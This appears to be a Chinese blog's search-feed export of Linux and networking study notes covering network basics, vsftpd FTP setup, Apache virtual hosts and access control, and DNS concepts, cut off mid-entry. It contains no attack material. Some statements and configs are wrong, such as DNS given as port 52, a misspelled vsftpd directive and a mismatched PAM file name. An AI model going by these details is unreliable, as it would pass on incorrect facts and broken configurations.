title="过程"></a>过程</h2><ul><li>数据发送时，从上至下逐层封装</li><li>数据接收时，从下至上逐层解封装</li><li>只有拆除外层封装，才能看到内层封装</li></ul>]]></content>
      
      
      <categories>
          
          <category> 数通学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数通学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机网络概述</title>
      <link href="/posts/10890"/>
      <url>/posts/10890</url>
      
        <content type="html"><![CDATA[<h1 id="什么是计算机？"><a href="#什么是计算机？" class="headerlink" title="什么是计算机？"></a>什么是计算机？</h1><p>计算机是现代一种用于高速计算的电子计算器，可以进行数值计算，又可以进行逻辑计算，还具有存储记忆功能。电脑是计算机的俗称但并不唯一，例如手机、智能电视具有计算功能的通信都是计算机。</p><h1 id="计算机网络？"><a href="#计算机网络？" class="headerlink" title="计算机网络？"></a>计算机网络？</h1><p>计算机网络是一组自治计算机互连的集合</p><h2 id="网络的基本功能"><a href="#网络的基本功能" class="headerlink" title="网络的基本功能"></a>网络的基本功能</h2><ul><li>资源共享</li><li>分布式处理与负载均衡</li><li>综合信息服务</li></ul><h1 id="计算机网络分类？"><a href="#计算机网络分类？" class="headerlink" title="计算机网络分类？"></a>计算机网络分类？</h1><p>LAN 局域网</p><ul><li>由用户自行建设，使用私有地址组建的内部网络</li></ul><p>MAN 城域网</p><ul><li>由运营商或大规模企业建设，连接城市范围的网络</li></ul><p>WAN 广域网</p><ul><li>由运营商建设、连接全国各个城域网的网络又称骨干网、核心网、传输网</li></ul><h1 id="网络拓扑？"><a href="#网络拓扑？" class="headerlink" title="网络拓扑？"></a>网络拓扑？</h1><p><img src="/images/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%A6%82%E8%BF%B0/%E7%BD%91%E7%BB%9C%E6%8B%93%E6%89%9101.jpg"></p><p>🐾定义：网络设备连接排列的方式(网络结构)</p><h2 id="分类📝"><a href="#分类📝" class="headerlink" title="分类📝"></a>分类📝</h2><ul><li><p>总线型拓扑：所有设备共享一条公共线路</p><p>线路中断会导致所有设备中断通讯</p></li><li><p>环型拓扑：所有设备共享一条环型总线</p><p>传输性能优于总线型拓扑</p></li><li><p>星型拓扑：其他节点都与中央节点直接相连</p></li></ul><p>​<strong>优点</strong>：某条线路中断不会影响其他节点</p><p>​<strong>缺点</strong>：中央节点故障会导致全网中断</p><ul><li><p>树型拓扑：星型拓扑的进一步发散型</p><p><strong>优点</strong>：结构简单，组网成本低。维护管理容易</p><p><strong>缺点</strong>：中央节点压力大，可靠性差</p></li><li><p>网状拓扑：节点之间有多余条路线可达</p><p><strong>优点</strong>：可靠性高</p><p><strong>缺点</strong>：组网成本高，维护管理复杂</p></li></ul><h1 id="衡量计算机网络的主要指标？"><a href="#衡量计算机网络的主要指标？" class="headerlink" title="衡量计算机网络的主要指标？"></a>衡量计算机网络的主要指标？</h1><p><font color=#0099ff size=6 face="黑体">带宽</font>（bandwidth）</p><ul><li><p>单位时间内能够传输的数据总量单位：bps[bit per second]</p></li><li><p>带宽越大，网络质量越好</p></li></ul><p><font color=#0099ff size=6 face="黑体">延迟</font>（delay）</p><ul><li>数据从一个字点到另一个字点消耗的时间</li><li>单位:ms  1s&#x3D;1000ms</li></ul><p><font  size=5 face="楷体">数据单位⤵</font></p><p><code>1Kb=1024b</code></p><p><code>1Mb=1024Kb</code></p><p><code>1Gb=1024Mb</code></p><p><code>Byte 字节，一个数字或字母占用1字节，一个汉字占用2字节</code></p><p><code>bit 比特，1Byte=8bit</code></p><h1 id="网络标准化组织"><a href="#网络标准化组织" class="headerlink" title="网络标准化组织"></a>网络标准化组织</h1><p>什么是协议？</p><p><code>数据通讯双方共同遵守的通讯规则</code></p><p>标准？</p><p><code>公认的，所有厂商所共同遵守的协议规则</code></p><p>标准化组织？</p><p><code>制定定义国际公认参考标准的组织团体</code></p><p><code>常见国际标准组织：</code></p><ul><li><p>​<code>ISO国际标准化组织</code></p></li><li><p>​<code>IEEE电子电器工程师协会</code></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 数通学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数通学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux之vsftp文件传输部署</title>
      <link href="/posts/15906"/>
      <url>/posts/15906</url>
      
        <content type="html"><![CDATA[<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><p>Windows11、VMware Workstation 16.2.2</p><h1 id="系统"><a href="#系统" class="headerlink" title="系统"></a>系统</h1><p>Red hat7.0</p><h1 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h1><h2 id="了解vsftp"><a href="#了解vsftp" class="headerlink" title="了解vsftp"></a>了解vsftp</h2><p>FTP(文件传输协议)全称是：Very Secure FTP Server。  Vsftpd是linux类操作系统上运行的ftp服务器软件。 </p><p>vsftp提供三种登陆方式：1.匿名登录 2.本地用户登录 3.虚拟用户登录</p><p>vsftp提供两种模式： Port模式（主动模式）–&gt; 默认  Pasv模式（被动方式）</p><p>vsftp安装：yum -y install vsftpd</p><p>vsftp主配置文件：&#x2F;etc&#x2F;vsftpd&#x2F;vsftpd.conf</p><h1 id="部署"><a href="#部署" class="headerlink" title="部署"></a>部署</h1><h2 id="项目一"><a href="#项目一" class="headerlink" title="项目一"></a>项目一</h2><ul><li>配置匿名用户访问的FTP站点</li></ul><p>1.创建目录🎄</p><p><code>[root@Jw2031-122 ~]# mkdir -p /ftp/share</code><br><code>[root@Jw2031-122 ~]# echo &quot;测试文件&quot; &gt;/ftp/share/test.txt</code></p><p>2.编辑允许匿名用户访问🎄</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@Jw2031-122 ~]# vim /etc/vsftpd/vsftpd.conf</span><br><span class="line">12 anonymous_enable=YES</span><br><span class="line">13 anon_root=/ftp/share</span><br></pre></td></tr></table></figure><p>3.测试…..略🎄</p><h2 id="项目二"><a href="#项目二" class="headerlink" title="项目二"></a>项目二</h2><ul><li>配置本地用户访问的FTP站点</li></ul><p>1.创建用户、目录🐥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[root@Jw2031-122 ~]# mkdir -p /var/www/web1</span><br><span class="line">[root@Jw2031-122 ~]# echo &quot;本地用户&quot; &gt;/var/www/web1/testftp.txt</span><br><span class="line">[root@Jw2031-122 ~]# chmod -R 757 /var/www/web1</span><br><span class="line">[root@Jw2031-122 ~]# useradd user1 -s /sbin/nologin</span><br><span class="line">[root@Jw2031-122 ~]# echo &quot;user1&quot; |passwd --stdin user1</span><br><span class="line">Changing password for user user1.</span><br><span class="line">passwd: all authentication tokens updated successfully.</span><br><span class="line">[root@Jw2031-122 ~]# chown -R user1 /var/www/web1</span><br></pre></td></tr></table></figure><p>2.配置文件编辑🐥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[root@Jw2031-122 ~]# vim /etc/vsftpd/vsftpd.conf</span><br><span class="line">17 local_enable=YES#允许本地用户登录</span><br><span class="line">18 local_root=/var/www/web1 #设置本地用户登录后的根目录</span><br><span class="line">21 write_enable=YES  #允许写入</span><br><span class="line">25 local_umask=022  #设定新上传文件权限掩码</span><br><span class="line">43 connect_from_port_20=YES  #控制以PORT模式进行数据传输时服务器是否使用20端口</span><br><span class="line">103 chroot_local_user=YES    #是否将所有用户限制在登录根目录内</span><br><span class="line">104 chroot_list_enable=YES   #开启锁定用户的chroot功能</span><br><span class="line">105 chroot_list_file=/etc/vsftpd/chroot_list  #设置锁定用户的列表文件</span><br></pre></td></tr></table></figure><p>3.将锁定用户加入到文件中🐥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@Jw2031-122 ~]# cat /etc/vsftpd/chroot_list</span><br><span class="line">user1</span><br></pre></td></tr></table></figure><p>4.测试……..略🐥</p><h2 id="项目三"><a href="#项目三" class="headerlink" title="项目三"></a>项目三</h2><ul><li>配置虚拟用户访问的ftp站点</li></ul><p><img src="/images/Linux%E4%B9%8Bvsftp%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93%E9%83%A8%E7%BD%B2/ftp01.jpg"></p><p>1.创建用户虚拟目录</p><p><code>[root@Jw2031-122 ~]# useradd user2 -s /sbin/nologin</code><br><code>[root@Jw2031-122 ~]# mkdir -p /ftp/public /var/www/web2</code><br><code>[root@Jw2031-122 ~]# echo &quot;虚拟用户1&quot; &gt;/ftp/public/user1.txt</code><br><code>[root@Jw2031-122 ~]# echo &quot;虚拟用户2&quot; &gt;/var/www/web2/user2.txt</code><br><code>[root@Jw2031-122 ~]# chown user2 /ftp/public /var/www/web2</code><br><code>[root@Jw2031-122 ~]# chmod -R 755 /ftp/public /var/www/web2</code></p><p>2.创建存放虚拟用户</p><p><code>[root@Jw2031-122 ~]# cat /etc/vsftpd/v_user.txt</code><br><code>zhang3</code><br><code>345</code><br><code>li4</code><br><code>678</code><br><code>[root@Jw2031-122 ~]#</code> </p><p>3.检查是否安装db_load转换工具</p><p><code>[root@Jw2031-122 ~]# rpm -qf /usr/bin/db_load</code><br><code>libdb-utils-5.3.21-17.el7.x86_64</code><br><code>[root@Jw2031-122 ~]#</code></p><p>4.将虚拟用户文件转化数据库文件</p><p><code>[root@Jw2031-122 ~]# db_load -T -t hash -f /etc/vsftpd/v_user.txt /etc/vsftpd/v_user.db</code><br><code>[root@Jw2031-122 ~]# file /etc/vsftpd/v_user.db</code><br><code>/etc/vsftpd/v_user.db: Berkeley DB (Hash, version 9, native byte-order)</code><br><code>[root@Jw2031-122 ~]# chmod 600 /etc/vsftpd/v_user*</code><br><code>[root@Jw2031-122 ~]#</code></p><p>5.建立用户登录时进行身份验证的PAM认证文件</p><p><code>[root@Jw2031-122 ~]# cp -p /etc/pam.d/vsftpd /etc/pam.d/vuser.v</code><br><code>[root@Jw2031-122 ~]# vim /etc/pam.d/vuser.v</code><br><code>auth            sufficient      /lib64/security/pam_userdb.so   db=/etc/vsftpd/v_user</code><br><code>account         sufficient      /lib64/security/pam_userdb.so   db=/etc/vsftpd/v_user</code><br><code>:wq!</code></p><p>6.修改主配置文件</p><p><code>[root@Jw2031-122 ~]# vim /etc/vsftpd/vsftpd.conf</code></p><p><code>17 local_enable=YES##使用虚拟用户一定要启用本地用户</code></p><p><code>126 pam_service_name=vuser.vu##指定对虚拟用户进行PAM认证的文件名vuser.vu</code></p><p><code>128 guest_enable=YES##启动虚拟用户功能，允许虚拟用户登录</code></p><p><code>129 guest_username=user2##指定虚拟用户对应本地用户</code></p><p><code>130 uest_config_dir=/etc/vsftpd/vconfig##指定虚拟用户的配置文件存放位置</code></p><p><code>131 virtual_use_local_privs=YES##虚拟用户和本地用户有相同权限</code></p><p><code>132 allow_writeable_chroot=YES##修复用户家目录因有写权限而出现的访问出错</code></p><p>7.为虚拟用户分别建立专用配置文件</p>]]></content>
      
      
      <categories>
          
          <category> Linux笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux之Apache部署Web网站</title>
      <link href="/posts/61748"/>
      <url>/posts/61748</url>
      
        <content type="html"><![CDATA[<p><em><center></em></p><p><img src="/images/%E6%9D%82%E5%9B%BE/%E8%A1%A8%E6%83%85%E5%8C%8502.png"></p><p><em></center></em></p><h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><p>Windows11、VMware Workstation 16.2.2</p><h1 id="系统"><a href="#系统" class="headerlink" title="系统"></a>系统</h1><p>Red hat7.4</p><h1 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h1><p>什么是Apache?</p><ul><li>Apache是一个基于流程的模块化Web服务器应用程序，它通过每个同时连接创建一个新线程。它支持许多功能; 其中许多都被编译为单独的模块并扩展其核心功能，并且可以提供从服务器端编程语言支持到身份验证机制的所有功能，它允许单个Apache Web服务器为许多不同的网站提供服务。</li></ul><p>web系统的组成？</p><ul><li><p>web服务是指能够让用户通过浏览器或APP访问并显示互联网中各类信息资源的服务。</p></li><li><p>web客户端：用户通过浏览器或APP接收其访问请求，以http或https将请求发送到网络中的web服务器，并将服务器的响应信息以图形界面显示出来。</p></li><li><p>web服务通信协议：实现web客户端与web服务器之间建立或关闭连接，传送网页信息的网络协议。主要有http和https两种协议，它们是再Internet上发布多媒体信息的应用层协议。</p></li><li><p>web服务器（web网站）：侦听和响应客户端http&#x2F;https请求，通过html（超文本标记语言）把信息组织成为图文并茂的超文本，并回送结果信息给客户端。</p></li></ul><h1 id="部署"><a href="#部署" class="headerlink" title="部署"></a>部署</h1><h2 id="项目一"><a href="#项目一" class="headerlink" title="项目一"></a>项目一</h2><p>1.配置🙀</p><p><strong>&#x2F;etc&#x2F;httpd&#x2F;conf&#x2F;httpd.conf</strong><br><code>ServerRoot &quot;/etc/httpd&quot;</code>#设置Apache的根目录为&#x2F;etc&#x2F;httpd<br><code>Listen 80</code>#设置http侦听端口为80<br><code>ServerAdmin AliZhs@outlook.com</code>#设置管理员E-mail地址为<a href="mailto:&#x41;&#x6c;&#x69;&#90;&#104;&#115;&#x40;&#111;&#x75;&#116;&#108;&#x6f;&#111;&#x6b;&#x2e;&#x63;&#111;&#109;">&#x41;&#x6c;&#x69;&#90;&#104;&#115;&#x40;&#111;&#x75;&#116;&#108;&#x6f;&#111;&#x6b;&#x2e;&#x63;&#111;&#109;</a><br><code>ServerName 192.168.22.110</code>#设置web服务器的主机名<br><code>DocumentRoot &quot;/var/www/html&quot;</code>#设置网页文档的存放位置<br><code>DirectoryIndex index.html</code>#指定首页文件的名称</p><p>2.创建首页文件🙀</p><p><strong>&#x2F;var&#x2F;www&#x2F;html</strong></p><p><code>[root@jw2031-122 html]# echo &quot;welcome to test index&quot; &gt; index.html</code>#写入<br><code>[root@jw2031-122 html]# apachectl configtest</code>#测试配置文件<br><code>Syntax OK</code></p><p>3.重启服务、测试略🙀</p><h2 id="项目二"><a href="#项目二" class="headerlink" title="项目二"></a>项目二</h2><p>使用<strong>虚拟目录</strong>为多个部门建立子网站</p><table><thead><tr><th>名称</th><th>虚拟目录别名</th><th>物理路径</th></tr></thead><tbody><tr><td>师部</td><td>无</td><td>&#x2F;abc&#x2F;shibu</td></tr><tr><td>炮团</td><td>&#x2F;paotuan</td><td>&#x2F;abc&#x2F;paotuan</td></tr><tr><td>侦察营</td><td>&#x2F;zhencha</td><td>&#x2F;abc&#x2F;zhencha</td></tr><tr><td>特战大队</td><td>&#x2F;tezhan</td><td>&#x2F;abc&#x2F;tezhan</td></tr></tbody></table><p>根据上图表配置虚拟目录，IP地址为<code>192.168.22.110</code></p><p>1.创建各自虚拟目录，并写入文档🐒</p><p><code>[root@jw2031-122 abc]# echo &quot;师部首页&quot; &gt;shibu/index.html</code><br><code>[root@jw2031-122 abc]# echo &quot;炮团首页&quot; &gt;paotuan/index.html</code><br><code>[root@jw2031-122 abc]# echo &quot;侦察营首页&quot; &gt;zhencha/index.html</code><br><code>[root@jw2031-122 abc]# echo &quot;特战大队首页&quot; &gt;tezhan/index.html</code></p><p>2.编辑虚拟目录配置文件🐒</p><p>在&#x2F;etc&#x2F;httpd&#x2F;conf.d&#x2F;目录下新建一个子配置文件来配置虚拟目录。</p><p><font size=2 style="color: red;">默认情况下，位于&#x2F;etc&#x2F;httpd&#x2F;conf.d&#x2F;目录下的所有以.conf结尾文件都会被加载作为Apache的配置信息.</font></p><p><img src="/images/linux%E4%B9%8BApache%E9%83%A8%E7%BD%B2web%E7%BD%91%E7%AB%99/web01.jpg"></p><p>3.Test🐒</p><p><img src="/images/linux%E4%B9%8BApache%E9%83%A8%E7%BD%B2web%E7%BD%91%E7%AB%99/web02.jpg" alt="image-20220520171539614"></p><h2 id="项目三"><a href="#项目三" class="headerlink" title="项目三"></a>项目三</h2><p>使用虚拟主机在一台主机上建立多个网站</p><p><img src="/images/linux%E4%B9%8BApache%E9%83%A8%E7%BD%B2web%E7%BD%91%E7%AB%99/web03.jpg"></p><p>根据上表搭建域名不同的两个虚拟主机</p><h3 id="基于域名的虚拟主机"><a href="#基于域名的虚拟主机" class="headerlink" title="基于域名的虚拟主机"></a>基于域名的虚拟主机</h3><p>1.创建所需目录和首页文件🐻</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@jw2031-122 ~]# echo &quot;taobao&quot;&gt;/var/www/taobao/index.html</span><br><span class="line">[root@jw2031-122 ~]# echo &quot;jd&quot; &gt;/var/www/jd/index.html</span><br></pre></td></tr></table></figure><p>2.复制配置虚拟主机的样本文件编辑主机配置文件🐻</p><p>虚拟主机模板位置**&#x2F;usr&#x2F;share&#x2F;doc&#x2F;httpd-2.4.6&#x2F;httpd-vhosts.conf**</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[root@jw2031-122 ~]# cp /usr/share/doc/httpd-2.4.6/httpd-vhosts.conf /etc/httpd/conf.d/</span><br><span class="line">[root@jw2031-122 conf.d]# cat httpd-vhosts.conf </span><br><span class="line">&lt;VirtualHost 192.168.1.2&gt;</span><br><span class="line">    DocumentRoot /var/www/taobao</span><br><span class="line">    ServerName www1.taobao.com</span><br><span class="line">    DirectoryIndex index.html</span><br><span class="line">&lt;/VirtualHost&gt;</span><br><span class="line">&lt;VirtualHost 192.168.1.2&gt;</span><br><span class="line">    DocumentRoot /var/www/jd</span><br><span class="line">    ServerName www1.jd.com</span><br><span class="line">    DirectoryIndex index.html</span><br><span class="line">&lt;/VirtualHost&gt;</span><br></pre></td></tr></table></figure><p>3.测试🐻</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@jw2031-122 ~]# curl www1.taobao.com</span><br><span class="line">taobao</span><br><span class="line">[root@jw2031-122 ~]# curl www1.jd.com</span><br><span class="line">jd</span><br></pre></td></tr></table></figure><h3 id="基于端口号的虚拟主机"><a href="#基于端口号的虚拟主机" class="headerlink" title="基于端口号的虚拟主机"></a>基于端口号的虚拟主机</h3><p>根据上表11-3】taobao设置端口号为80，jd设置为8080</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vim  /etc/httpd/conf/httpd.conf</span><br><span class="line"> 42 Listen 80#设置侦听端口</span><br><span class="line"> 43 Listen 8080</span><br></pre></td></tr></table></figure><br /><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[root@jw2031-122 ~]# cat /etc/httpd/conf.d/httpd-vhosts.conf </span><br><span class="line">&lt;VirtualHost 192.168.1.2:80&gt;</span><br><span class="line">    DocumentRoot /var/www/taobao</span><br><span class="line">&lt;/VirtualHost&gt;</span><br><span class="line">&lt;VirtualHost 192.168.1.2:8080&gt;</span><br><span class="line">    DocumentRoot /var/www/jd</span><br><span class="line">&lt;/VirtualHost&gt;</span><br></pre></td></tr></table></figure><br /><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[root@jw2031-122 ~]# curl 192.168.1.2:80</span><br><span class="line">taobao80</span><br><span class="line">[root@jw2031-122 ~]# curl 192.168.1.2:8080</span><br><span class="line">jd8080</span><br><span class="line">[root@jw2031-122 ~]# </span><br></pre></td></tr></table></figure><h3 id="基于IP地址的虚拟主机"><a href="#基于IP地址的虚拟主机" class="headerlink" title="基于IP地址的虚拟主机"></a>基于IP地址的虚拟主机</h3><p><img src="/images/linux%E4%B9%8BApache%E9%83%A8%E7%BD%B2web%E7%BD%91%E7%AB%99/web04.jpg"></p><p>按照上图配置</p><p>1.设置IP地址🐎</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/sysconfig/network-scripts/ifcfg-ens33</span><br><span class="line">......................</span><br><span class="line">IPADDR=192.168.1.2</span><br><span class="line">IPADDR1=192.168.1.1</span><br><span class="line">NETMASK=255.255.255.0</span><br><span class="line">NETMASK1=255.255.255.0</span><br><span class="line">.......</span><br></pre></td></tr></table></figure><p>2.创建相应目录🐎</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@jw2031-122 ~]# mkdir -p /var/www/web1</span><br><span class="line">[root@jw2031-122 ~]# mkdir -p /var/www/web4</span><br><span class="line">[root@jw2031-122 ~]# echo &quot;192.168.1.1 index&quot; &gt;/var/www/web1/index.html</span><br><span class="line">[root@jw2031-122 ~]# echo &quot;192.168.1.2 index&quot; &gt;/var/www/web4/index.html</span><br></pre></td></tr></table></figure><p>3.编辑虚拟主机文件🐎</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[root@jw2031-122 conf.d]# cat httpd-vhosts.conf </span><br><span class="line">&lt;VirtualHost 192.168.1.1&gt;</span><br><span class="line">    ServerName 192.168.1.1</span><br><span class="line">    DocumentRoot /var/www/web1</span><br><span class="line">&lt;/VirtualHost&gt;</span><br><span class="line">&lt;VirtualHost 192.168.1.2&gt;</span><br><span class="line">    ServerName 192.168.1.2</span><br><span class="line">    DocumentRoot /var/www/web4</span><br><span class="line">&lt;/VirtualHost&gt;</span><br></pre></td></tr></table></figure><br/><p>4.test🐎</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@jw2031-122 conf.d]# curl 192.168.1.1</span><br><span class="line">192.168.1.1 index</span><br><span class="line">[root@jw2031-122 conf.d]# curl 192.168.1.2</span><br><span class="line">192.168.1.2 index</span><br></pre></td></tr></table></figure><br /><h2 id="项目四"><a href="#项目四" class="headerlink" title="项目四"></a>项目四</h2><p style="text-align:center;color:#9EC044;font-size:1.5em;font-weight: bold;">Web服务器的访问控制<h3 id="基于用户认证的访问控制"><a href="#基于用户认证的访问控制" class="headerlink" title="基于用户认证的访问控制"></a>基于用户认证的访问控制</h3><p>1.创建用户保存到teacherwed认证文件中🐾</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@jw2031-122 ~]# htpasswd -c /etc/httpd/.teacherwd zhang3</span><br><span class="line">New password: </span><br><span class="line">Re-type new password: </span><br><span class="line">Adding password for user zhang3</span><br></pre></td></tr></table></figure><p><font size=2 style="color: red;">htpasswd命令中”-c”选项表示无论认证文件是否存在，都重新写入文件并删除文件中原有的内容，因此添加第二个用户时，就无需再使用”-c”选项了，修改zhang3密码为htpasswd -m &#x2F;etc&#x2F;httpd&#x2F;.teacherwd zhang3。</font></p><br /><p>2.创建虚拟目录🐾</p><p><code>[root@jw2031-122 ~]# mkdir -p /www/lute</code><br><code>[root@jw2031-122 ~]# echo &quot;cainiao&quot; &gt;/www/lute/index.html</code></p><p>3.设置虚拟目录添加认证访问🐾</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[root@jw2031-122 ~]# cat /etc/httpd/conf.d/vdir.conf </span><br><span class="line">Alias /test   /www/lute</span><br><span class="line">&lt;Directory &quot;/www/lute&quot;&gt;</span><br><span class="line">    AuthType Basic</span><br><span class="line">    AuthName &quot;welcome&quot;</span><br><span class="line">    AuthUserFile /etc/httpd/.teacherwd</span><br><span class="line">    Require valid-user</span><br><span class="line">&lt;/Directory&gt;</span><br></pre></td></tr></table></figure><p>4.测试、略🐾………………………</p><h3 id="基于客户端地址的访问控制"><a href="#基于客户端地址的访问控制" class="headerlink" title="基于客户端地址的访问控制"></a>基于客户端地址的访问控制</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[root@jw2031-122 ~]# cat /etc/httpd/conf.d/vdir.conf</span><br><span class="line">Alias /test   /www/lute</span><br><span class="line">&lt;Directory &quot;/www/lute&quot;&gt;</span><br><span class="line">    AuthType Basic</span><br><span class="line">    AuthName &quot;welcome&quot;</span><br><span class="line">    AuthUserFile /etc/httpd/.teacherwd</span><br><span class="line"> &lt;RequireAll&gt;</span><br><span class="line">    Require valid-user     #开启用户验证机制</span><br><span class="line">Require not ip 192.168.1.2      #禁止IP地址客户端访问</span><br><span class="line"> &lt;/RequireAll&gt;</span><br><span class="line">&lt;/Directory&gt;</span><br></pre></td></tr></table></figure><p>&#96;</p>]]></content>
      
      
      <categories>
          
          <category> Linux笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux之Unbound实现域名解析</title>
      <link href="/posts/45955"/>
      <url>/posts/45955</url>
      
        <content type="html"><![CDATA[<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><p>Windows11、VMware Workstation 16.2.2</p><h1 id="系统"><a href="#系统" class="headerlink" title="系统"></a>系统</h1><p>Red hat7.0</p><h1 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h1><h2 id="作用及协议"><a href="#作用及协议" class="headerlink" title="作用及协议"></a>作用及协议</h2><ul><li>将域名解析成IP地址<br>原因是我们数字不敏感，记不住这个ip地址，所以才有了域名解析服务</li><li>DNS服务既属于TCP协议也属于UDP协议，端口号为52号</li></ul><h2 id="解析方式"><a href="#解析方式" class="headerlink" title="解析方式"></a>解析方式</h2><ul><li><p>正向解析：域名解析出IP</p><p>正向解析文件中存储的记录称为A记录，A记录记录着域名和ip的映射关系</p></li><li><p>反向解析：IP解析出域名</p><p>反向解析文件中存储的记录称为PTR指针，PTR记录着IP和域名的映射关系</p></li></ul><h2 id="域的分类"><a href="#域的分类" class="headerlink" title="域的分类"></a>域的分类</h2><ul><li>根域 ：（·）</li><li>国家域：中国（cn），香港（hk），英国（uk）</li><li>顶级域（领域）：商业用途（com），网络组织（net），教育（edu）</li><li>二级域：个性化的名称，每个域的二级域都不一样</li><li>主机名（用途）：网页（www），邮件（mail）</li></ul><h2 id="DNS查询过程"><a href="#DNS查询过程" class="headerlink" title="DNS查询过程"></a>DNS查询过程</h2><p>第一步：客户机提出域名解析请求,并将该请求发送给本地域名服务器。</p><p>第二步：当本地域名服务器收到请求后,就先查询本地 缓存,如果 该纪录项,则本地 域名服务器就直接把查询 结果返回。</p><p>第三步：如果本地缓存中没该纪录,则本地域名服务器就直接把请求发给根域名服务器,然后根域名服务器再返回给本地域名服务器一个所查询域(根子域)主域名服务器地址。</p><p>第四步：本地服务器再向 一步返回 域名服务器发送请求,然后接受请求 服务器查询自己 缓存,如果没 该纪录,则返回相关 下级 域名服务器 地址。</p><p>第五步：重复第四步,直到找到正确纪录。</p><p>第六步：本地域名服务器把返回 结果保存到缓存,以备下一次使用,同时还将结果返回给客户机。</p><h3 id="递归查询和迭代查询"><a href="#递归查询和迭代查询" class="headerlink" title="递归查询和迭代查询"></a>递归查询和迭代查询</h3><ul><li><p><strong>递归查询</strong>：在该模式下DNS服务器接收到客户机请求，必须使用一个准确的查询结果回复客户机。如果DNS服务器本地没有存储查询DNS信息，那么该服务器会询问其他服务器，并将返回的查询结果提交给客户机。</p></li><li><p><strong>迭代查询</strong>：DNS所在服务器若没有可以响应的结果，会向客户机提供其他能够解析查询请求的DNS服务器地址，当客户机发送查询请求时，DNS服务器并不直接回复查询结果，而是告诉客户机另一台DNS服务器地址，客户机再向这台DNS服务器提交请求，依次循环直到返回查询的结果为止。</p></li></ul><h1 id="部署"><a href="#部署" class="headerlink" 